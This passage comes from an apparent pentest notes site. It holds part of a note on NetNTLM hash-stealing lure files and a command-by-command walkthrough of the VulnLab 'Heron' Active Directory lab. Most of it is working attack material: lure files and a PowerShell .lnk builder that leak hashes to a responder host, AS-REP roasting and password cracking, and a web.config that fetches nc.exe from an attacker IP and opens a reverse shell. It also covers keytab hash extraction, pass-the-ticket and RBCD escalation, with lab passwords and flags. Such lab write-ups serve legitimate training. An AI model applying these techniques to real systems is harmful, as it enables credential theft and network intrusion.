TargetMode=\u0026#34;External\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt;\rFigure 2: leak NetNTLM hashes using Word\nIt should be noted that this particular trick doesn\u0026rsquo;t work if the Word document is opened in Protected View. This is normally the case if the document is opened from a website or opened from an email message.\nLiving off the land If no mitigations have been applied, it is not very hard to trick Windows to leak hashes. Essentially any document format that allows loading of external files from UNC paths should be affected by this flaw. To get an idea how easy it is to find such methods, a number of them are listed below. This is by far an exhaustive list, it just demonstrates how prevalent this issue is. Of course an attacker still needs to entice the user into performing a certain action.\nURL handlers Besides abusing files there are other ways to force applications to open files from (rogue) network shares. One such way is with the use of URL handlers. A large number of applications register custom URL schemes. For example, Word registers the ms-word URL scheme. This scheme accepts a path that can be used to cause Word to try to open a file from a UNC path. Consequently, the ms-word URL scheme can be used to steal NetNTLM hashes. Other URL handlers can be abused in a similar manner.\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;script\u0026gt; location.href = \u0026#39;ms-word:ofe|u|\\\\\u0026lt;responder ip\u0026gt;\\leak\\leak.docx\u0026#39;; \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt;\rInternet Shortcut Another trick is to just create a shortcut to the rogue share. Windows has a special URL file type that is used to create shortcuts to webpages. A simple version looks something like this:\nleak.url:\n[InternetShortcut] URL=file://\u0026lt;responder ip\u0026gt;/leak/leak.html\rIt is possible to assign an icon to this shortcut. When Windows Explorer encounters a URL file it will automatically parse it to see if there is an icon associated to the shortcut. Setting the icon to an UNC path will cause Windows Explorer to try and load it, again leaking hashes. This happens when the user just browses to the folder containing the URL file. So if an attacker managers to drop a URL file in the user\u0026rsquo;s download folder, hashes are leaked every time the user views the download folder in Explorer. Similar attacks are possible using other shortcut type of file formats, which is also useful with USB drops.\nleak2.url:\n[InternetShortcut] URL=https://securify.nl IconIndex=0 IconFile=\\\\\u0026lt;responder ip\u0026gt;\\leak\\leak.ico\rWindows Media Player Media players tend to support many audio and video file formats and playlists. Playlists can be seen as a collection of links to external files, including files located on network shares. Naturally this can be abused to steal NetNTLM hashes. Windows Media Player is no exception, opening a specially crafted playlist in Windows Media Player can potentially disclose hashes to an attacker.\nleak.m3u:\n#EXTM3U #EXTINF:1337, Leak \\\\\u0026lt;responder ip\u0026gt;\\leak.mp3\rleak.asx:\n\u0026lt;asx version=\u0026#34;3.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Leak\u0026lt;/title\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;ref href=\u0026#34;file://\u0026lt;responder ip\u0026gt;/leak/leak.wma\u0026#34;/\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;/asx\u0026gt;\r_[leak.wax]:\nhttps://10.8.3.12/test file://\\\\10.8.3.12/steal/file\rJava Web Start Many enterprise still use Java applications. There is a good chance that they also have Java Web Start enabled. Java Web Start allows users to start Java applications from the internet using a browser. A Java Web Start application is launched by opening a JNLP file. JNLP files are XML files that define how the application should be started. It also contains links to one or more JAR files. These JAR files could be located on network shares thus are a good target for leaking hashes.\nleak.jnlp:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;jnlp spec=\u0026#34;1.0+\u0026#34; codebase=\u0026#34;\u0026#34; href=\u0026#34;\u0026#34;\u0026gt; \u0026lt;resources\u0026gt; \u0026lt;jar href=\u0026#34;file://\u0026lt;responder ip\u0026gt;/leak/leak.jar\u0026#34;/\u0026gt; \u0026lt;/resources\u0026gt; \u0026lt;application-desc/\u0026gt; \u0026lt;/jnlp\u0026gt;\rIt should be noted that while JNLP files can be opened from a browser they are block by Microsoft Outlook on Windows. JNLP files are allowed on Outlook for macOS though.\nFigure 3: JNLP files are blocked in Outlook\nClickOnce .NET\u0026rsquo;s counterpart to Java Web Start is named ClickOnce. It works in a similar manner, applications are started via a ClickOnce deployment manifest file. These files can also contain UNC paths, similar to Java Web Start. Remarkably, ClickOnce deployment manifests are not blocked by Outlook.\nFigure 4: ClickOnce deployment manifest files are not blocked in Outlook\nleak.application:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;asmv1:assembly xsi:schemaLocation=\u0026#34;urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd\u0026#34; manifestVersion=\u0026#34;1.0\u0026#34; xmlns:dsig=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34; xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v2\u0026#34; xmlns:asmv1=\u0026#34;urn:schemas-microsoft-com:asm.v1\u0026#34; xmlns:asmv2=\u0026#34;urn:schemas-microsoft-com:asm.v2\u0026#34; xmlns:xrml=\u0026#34;urn:mpeg:mpeg21:2003:01-REL-R-NS\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;assemblyIdentity name=\u0026#34;Leak.app\u0026#34; version=\u0026#34;1.0.0.0\u0026#34; publicKeyToken=\u0026#34;0000000000000000\u0026#34; language=\u0026#34;neutral\u0026#34; processorArchitecture=\u0026#34;x86\u0026#34; xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v1\u0026#34; /\u0026gt; \u0026lt;description asmv2:publisher=\u0026#34;Leak\u0026#34; asmv2:product=\u0026#34;Leak\u0026#34; asmv2:supportUrl=\u0026#34;\u0026#34; xmlns=\u0026#34;urn:schemas-microsoft-com:asm.v1\u0026#34; /\u0026gt; \u0026lt;deployment install=\u0026#34;false\u0026#34; mapFileExtensions=\u0026#34;true\u0026#34; trustURLParameters=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;dependentAssembly dependencyType=\u0026#34;install\u0026#34; codebase=\u0026#34;file://\u0026lt;responder ip\u0026gt;/leak/Leak.exe.manifest\u0026#34; size=\u0026#34;32909\u0026#34;\u0026gt; \u0026lt;assemblyIdentity name=\u0026#34;Leak.exe\u0026#34; version=\u0026#34;1.0.0.0\u0026#34; publicKeyToken=\u0026#34;0000000000000000\u0026#34; language=\u0026#34;neutral\u0026#34; processorArchitecture=\u0026#34;x86\u0026#34; type=\u0026#34;win32\u0026#34; /\u0026gt; \u0026lt;hash\u0026gt; \u0026lt;dsig:Transforms\u0026gt; \u0026lt;dsig:Transform Algorithm=\u0026#34;urn:schemas-microsoft-com:HashTransforms.Identity\u0026#34; /\u0026gt; \u0026lt;/dsig:Transforms\u0026gt; \u0026lt;dsig:DigestMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#sha1\u0026#34; /\u0026gt; \u0026lt;dsig:DigestValue\u0026gt;ESZ11736AFIJnp6lKpFYCgjw4dU=\u0026lt;/dsig:DigestValue\u0026gt; \u0026lt;/hash\u0026gt; \u0026lt;/dependentAssembly\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/asmv1:assembly\u0026gt;\r_[Malicious ink (SMB)]:\nCreate a malicious that connect to our responder . $objShell = New-Object -ComObject WScript.Shell $lnk = $objShell.CreateShortcut(\u0026#34;C:\\Malicious.lnk\u0026#34;) $lnk.TargetPath = \u0026#34;\\\\10.8.3.12\\@threat.png\u0026#34; $lnk.WindowStyle = 1 $lnk.IconLocation = \u0026#34;%windir%\\system32\\shell32.dll, 3\u0026#34; $lnk.Description = \u0026#34;Browsing to the dir this file lives in will perform an authentication request.\u0026#34; $lnk.HotKey = \u0026#34;Ctrl+Alt+O\u0026#34; $lnk.Save()\r_[MSSQL]:\nEXEC master.sys.xp_dirtree \u0026#39;\\\\10.8.3.12\\myshare\u0026#39;,1,1 smbserver.py -smb2support share .\rTool : https://github.com/Greenwolf/ntlm_theft ","date":"2023-09-07","id":52,"permalink":"/notes/ad/hash-stealing/","summary":"\u003ch2 id=\"internet-explorer--edge\"\u003eInternet Explorer \u0026amp; Edge\u003c/h2\u003e\n\u003cp\u003eWhile the \u003ccode\u003edir\u003c/code\u003e command can be used to leak hashes, it is not very convenient method for an attacker. A more likely scenario would be if the attacker entices the victim to visit the attacker\u0026rsquo;s website or open a specially crafted file. As is widely known, Internet Explorer can leak NetNTLM hashes to websites containing embedded content (eg, images, stylesheets) loaded from a UNC path. This also applies to Microsoft Edge, which can be abused in the same way. This can be tested using the following HTML:\u003c/p\u003e","tags":[],"title":"Hash stealing"},{"content":" Leak creds : pentest Heron123!\nTwo users :\nsvc-web-accounting-d svc-web-accounting\rPivot : ssh -R1080: pentest@10.8.3.12 -N\rPort 80 open on the DC : ##### Wayne Wood CEO Email: wayne.wood@heron.vl ##### Julian Pratt Head of IT Email: julian.pratt@heron.vl ##### Samuel Davies Accounting Email: samuel.davies@heron.vl\rsvc-web-accounting-d svc-web-accounting wayne.wood julian.pratt samuel.davies\rAesproasting : proxychains GetNPUsers.py heron.vl/ -usersfile users -format hashcat -outputfile hashes.asreproast $krb5asrep$23$samuel.davies@HERON.VL:0dbfbcec40448e526154055d25c166c7$343f5ceb6d39b584689f511a9dcf9aacdcdf6df6fa41710a8337f1f9e5aba024d7c6f1d51cac5136562e158f93c841f60b79736f256cab8e8ffda8fc65d102e1393f6119a067793d02983d797d012298e7df2fdd9f19e457c2107a6a22234bef0481a76cf3931e4603cba6b93ac1d43c88d3793cb97c5a7ee738e8299a8a19511ebccfbd71092f2170e35daddd39244151680fb5661afe79d5fdca7389df1538bbea67c2dac8a2cffc0ebdb19d3c83f3b2712f3529bb1c442087bfaf2706e1b84aba0a5e8caedb3c0684b4bdd5279c89323ec85a2f034fe9982b26ba9b06f595a23d1199 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast samuel.davies : l6fkiy9oN Creds Password: H3r0n2024#! action: U newName: _local fullName: description: local administrator hangeLogon: 0 noChange: 0 neverExpires: 1 acctDisabled: 0 subAuthority: RID_ADMIN userName: Administrator (built-in)\rproxychains -q nxc smb 10.10.168.101 -u users -p \u0026#39;H3r0n2024#!\u0026#39; SMB 10.10.168.101 445 MUCDC [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True) SMB 10.10.168.101 445 MUCDC [+] heron.vl\\svc-web-accounting-d:H3r0n2024#!\rSMB :\nproxychains -q netexec smb 10.10.252.149 -u svc-web-accounting-d -p \u0026#39;H3r0n2024#!\u0026#39; --shares smbclient.py heron.vl/svc-web-accounting-d:\u0026#39;H3r0n2024#!\u0026#39;@10.10.168.101 #write access on accounting$ share\rRCE with web.config : \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;location path=\u0026#34;.\u0026#34; inheritInChildApplications=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;handlers\u0026gt; \u0026lt;add name=\u0026#34;aspNetCore\u0026#34; path=\u0026#34;toto\u0026#34; verb=\u0026#34;*\u0026#34; modules=\u0026#34;AspNetCoreModuleV2\u0026#34; resourceType=\u0026#34;Unspecified\u0026#34; /\u0026gt; \u0026lt;/handlers\u0026gt; \u0026lt;aspNetCore processPath=\u0026#39;cmd.exe\u0026#39; arguments=\u0026#39;/c curl http://10.8.3.12:8080/nc.exe \u0026gt; nc.exe\u0026#39; stdoutLogEnabled=\u0026#34;false\u0026#34; stdoutLogFile=\u0026#34;.\\logs\\stdout\u0026#34; hostingModel=\u0026#34;OutOfProcess\u0026#34; /\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/location\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;location path=\u0026#34;.\u0026#34; inheritInChildApplications=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;handlers\u0026gt; \u0026lt;add name=\u0026#34;aspNetCore\u0026#34; path=\u0026#34;toto\u0026#34; verb=\u0026#34;*\u0026#34; modules=\u0026#34;AspNetCoreModuleV2\u0026#34; resourceType=\u0026#34;Unspecified\u0026#34; /\u0026gt; \u0026lt;/handlers\u0026gt; \u0026lt;aspNetCore processPath=\u0026#39;cmd.exe\u0026#39; arguments=\u0026#39;/c nc.exe 10.8.3.12 4242 -e cmd\u0026#39; stdoutLogEnabled=\u0026#34;false\u0026#34; stdoutLogFile=\u0026#34;.\\logs\\stdout\u0026#34; hostingModel=\u0026#34;OutOfProcess\u0026#34; /\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/location\u0026gt; \u0026lt;/configuration\u0026gt; proxychains -q curl --ntlm -u heron\\\\svc-web-accounting-d:\u0026#39;H3r0n2024#!\u0026#39; http://accounting.heron.vl:80/toto -vv\rFlag : VL{8f0f33fd2d2bad2152564ae5306daf70}\nPassword Lonting : C:\\Windows\\script\\ssh.ps1 [server] sliver (UGLY_KAZOO) \u0026gt; cat ssh.ps1 $plinkPath = \u0026#34;C:\\Program Files\\PuTTY\\plink.exe\u0026#34; $targetMachine = \u0026#34;frajmp\u0026#34; $user = \u0026#34;_local\u0026#34; $password = \u0026#34;Deplete5DenialDealt\u0026#34; \u0026amp; \u0026#34;$plinkPath\u0026#34; -ssh -batch $user@$targetMachine -pw $password \u0026#34;ps auxf; ls -lah /home; exit\u0026#34;\rsu root cat /etc/krb5.keytab | base64 BQIAAAA2AAEACEhFUk9OLlZMAAdGUkFKTVAkAAAAAWZhxFECABcAEG9Vs7RD7xksgEsq6Y6CVPcA AAACAAAANgABAAhIRVJPTi5WTAAHRlJBSk1QJAAAAAFmYcRRAgARABDcquoM3ER17um/eOamy9DN AAAAAgAAAEYAAQAISEVST04uVkwAB0ZSQUpNUCQAAAABZmHEUQIAEgAge+ROYuJLpfSlAkwYWt4M 0wVrYAu5xp8R2jBQ3VhhMOcAAAACAAAAOwACAAhIRVJPTi5WTAAEaG9zdAAGRlJBSk1QAAAAAWZh xFECABcAEG9Vs7RD7xksgEsq6Y6CVPcAAAACAAAAOwACAAhIRVJPTi5WTAAEaG9zdAAGRlJBSk1Q AAAAAWZhxFECABEAENyq6gzcRHXu6b945qbL0M0AAAACAAAASwACAAhIRVJPTi5WTAAEaG9zdAAG RlJBSk1QAAAAAWZhxFECABIAIHvkTmLiS6X0pQJMGFreDNMFa2ALucafEdowUN1YYTDnAAAAAgAA AEQAAgAISEVST04uVkwABGhvc3QAD2ZyYWptcC5oZXJvbi52bAAAAAFmYcRRAgAXABBvVbO0Q+8Z LIBLKumOglT3AAAAAgAAAEQAAgAISEVST04uVkwABGhvc3QAD2ZyYWptcC5oZXJvbi52bAAAAAFm YcRRAgARABDcquoM3ER17um/eOamy9DNAAAAAgAAAFQAAgAISEVST04uVkwABGhvc3QAD2ZyYWpt cC5oZXJvbi52bAAAAAFmYcRRAgASACB75E5i4kul9KUCTBha3gzTBWtgC7nGnxHaMFDdWGEw5wAA AAIAAABIAAIACEhFUk9OLlZMABFSZXN0cmljdGVkS3JiSG9zdAAGRlJBSk1QAAAAAWZhxFECABcA EG9Vs7RD7xksgEsq6Y6CVPcAAAACAAAASAACAAhIRVJPTi5WTAARUmVzdHJpY3RlZEtyYkhvc3QA BkZSQUpNUAAAAAFmYcRRAgARABDcquoM3ER17um/eOamy9DNAAAAAgAAAFgAAgAISEVST04uVkwA EVJlc3RyaWN0ZWRLcmJIb3N0AAZGUkFKTVAAAAABZmHEUQIAEgAge+ROYuJLpfSlAkwYWt4M0wVr YAu5xp8R2jBQ3VhhMOcAAAACAAAAUQACAAhIRVJPTi5WTAARUmVzdHJpY3RlZEtyYkhvc3QAD2Zy YWptcC5oZXJvbi52bAAAAAFmYcRRAgAXABBvVbO0Q+8ZLIBLKumOglT3AAAAAgAAAFEAAgAISEVS T04uVkwAEVJlc3RyaWN0ZWRLcmJIb3N0AA9mcmFqbXAuaGVyb24udmwAAAABZmHEUQIAEQAQ3Krq DNxEde7pv3jmpsvQzQAAAAIAAABhAAIACEhFUk9OLlZMABFSZXN0cmljdGVkS3JiSG9zdAAPZnJh am1wLmhlcm9uLnZsAAAAAWZhxFECABIAIHvkTmLiS6X0pQJMGFreDNMFa2ALucafEdowUN1YYTDn AAAAAg==\rExtract hash :\npython3 keytabextract.py krb5.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash. [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction. [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction. [+] Keytab File successfully imported. REALM : HERON.VL SERVICE PRINCIPAL : FRAJMP$/ NTLM HASH : 6f55b3b443ef192c804b2ae98e8254f7 AES-256 HASH : 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7 AES-128 HASH : dcaaea0cdc4475eee9bf78e6a6cbd0cd\rFlag : VL{5112c412c73712e84fc3d01a30298760}\nKerberoasting :\nproxychains -q GetUserSPNs.py -no-preauth \u0026#34;samuel.davies\u0026#34; -usersfile user.txt -dc-host \u0026#34;10.10.168.101\u0026#34; \u0026#34;dc.heron.vl\u0026#34;/ proxychains -q nxc ldap 10.10.168.101 -u svc-web-accounting-d -p \u0026#39;H3r0n2024#!\u0026#39; --kerberoasting output.txt\rMore Looting :\nproxychains -q nxc smb mucdc.heron.vl -u user.txt -p \u0026#39;Deplete5DenialDealt\u0026#39; --continue-on-success [+] heron.vl\\Julian.Pratt:Deplete5DenialDealt proxychains -q getTGT.py \u0026#39;heron.vl\u0026#39;/\u0026#39;Julian.Pratt\u0026#39;:\u0026#39;Deplete5DenialDealt\u0026#39; -dc-ip 10.10.254.53 ticketConverter.py Julian.Pratt.ccache Julian.Pratt.kirbi .\\Rubeus.exe ptt /ticket:Julian.Pratt.kirbi dir \\\\mucdc.heron.vl\\C$\\Users\\julian.pratt\\ cat mucjmp.lnk adm_prju@mucjmp -pw ayDMWV929N9wAiB4\rRBCD :\nrbcd.py -delegate-from \u0026#39;FRAJMP$\u0026#39; -delegate-to \u0026#39;mucdc\u0026#39; -action \u0026#39;write\u0026#39; \u0026#39;heron.vl/adm_prju:ayDMWV929N9wAiB4\u0026#39; proxychains -q getST.py -spn \u0026#39;cifs/mucdc.heron.vl\u0026#39; -impersonate \u0026#39;_admin\u0026#39; \u0026#39;heron.vl/FRAJMP$\u0026#39; -hashes :6f55b3b443ef192c804b2ae98e8254f7 -debug export KRB5CCNAME=_admin.ccache proxychains -q netexec smb 10.10.254.53 --use-kcache -x \u0026#34;type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34;\r","date":"2023-09-07","id":53,"permalink":"/notes/lab/vulnlab/heron/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLeak creds :\n\u003ccode\u003epentest Heron123!\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eTwo users :\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esvc-web-accounting-d\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esvc-web-accounting\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePivot :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -R1080: pentest@10.8.3.12 -N\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003ePort 80 open on the DC :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e##### Wayne Wood\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCEO\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEmail: wayne.wood@heron.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e##### Julian Pratt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHead of IT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEmail: julian.pratt@heron.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e##### Samuel Davies\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccounting\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEmail: samuel.davies@heron.vl\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esvc-web-accounting-d\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esvc-web-accounting\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewayne.wood\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejulian.pratt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esamuel.davies\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eAesproasting :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxychains GetNPUsers.py heron.vl/ -usersfile users -format hashcat -outputfile hashes.asreproast\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$krb5asrep$23$samuel\u003c/span\u003e.davies@HERON.VL:0dbfbcec40448e526154055d25c166c7\u003cspan class=\"nv\"\u003e$343\u003c/span\u003ef5ceb6d39b584689f511a9dcf9aacdcdf6df6fa41710a8337f1f9e5aba024d7c6f1d51cac5136562e158f93c841f60b79736f256cab8e8ffda8fc65d102e1393f6119a067793d02983d797d012298e7df2fdd9f19e457c2107a6a22234bef0481a76cf3931e4603cba6b93ac1d43c88d3793cb97c5a7ee738e8299a8a19511ebccfbd71092f2170e35daddd39244151680fb5661afe79d5fdca7389df1538bbea67c2dac8a2cffc0ebdb19d3c83f3b2712f3529bb1c442087bfaf2706e1b84aba0a5e8caedb3c0684b4bdd5279c89323ec85a2f034fe9982b26ba9b06f595a23d1199\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ejohn --wordlist\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/share/wordlists/rockyou.txt  hashes.asreproast\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esamuel.davies : l6fkiy9oN \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCreds\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword: H3r0n2024#!\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaction: U\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enewName: _local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efullName:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edescription: \u003cspan class=\"nb\"\u003elocal\u003c/span\u003e administrator\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehangeLogon: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enoChange: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eneverExpires: \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eacctDisabled: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esubAuthority: RID_ADMIN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euserName: Administrator \u003cspan class=\"o\"\u003e(\u003c/span\u003ebuilt-in\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan 